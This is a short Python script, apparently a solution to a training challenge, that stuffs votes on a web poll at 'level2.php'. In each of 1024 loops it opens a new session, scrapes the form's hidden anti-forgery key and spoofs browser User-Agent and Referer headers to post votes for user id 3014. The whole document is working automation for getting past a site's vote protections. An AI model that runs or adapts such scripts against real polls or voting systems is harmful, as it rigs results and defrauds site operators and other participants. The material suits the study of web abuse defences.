#!/usr/bin/python3
from bs4 import BeautifulSoup
import requests
import sys

success_votes = 0
error_cases = 0
user_id = 3014
number_print = 1024
url = "http://158.69.76.135/level2.php"
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
     AppleWebKit/537.36 (KHTML, like Gecko)\
     Chrome/91.0.4501.0 Safari/537.36 Edg/91.0.866.0',
    'Referer': url
}

for i in range(0, number_print):
    cookies_page = requests.session()
    r = cookies_page.get(url)
#    print(r.cookies)

    soup = BeautifulSoup(r.text, "lxml")
    key_value = soup.find('form').find('input', {'name': 'key'})['value']

    votation = {'id': user_id, 'holdthedoor': 'Submit', 'key': key_value}
    vote = cookies_page.post(url, headers=header, data=votation)
#    print(vote.cookies)

    if vote.status_code == 200:
        success_votes += 1
    else:
        error_cases += 1

print("-------------------")
print("print success: {}".format(success_votes))
print("error_cases: {}".format(error_cases), file=sys.stderr)
print("-------------------")
if error_cases == 0:
    print("Success operation: 100% of {} votes".format(success_votes))
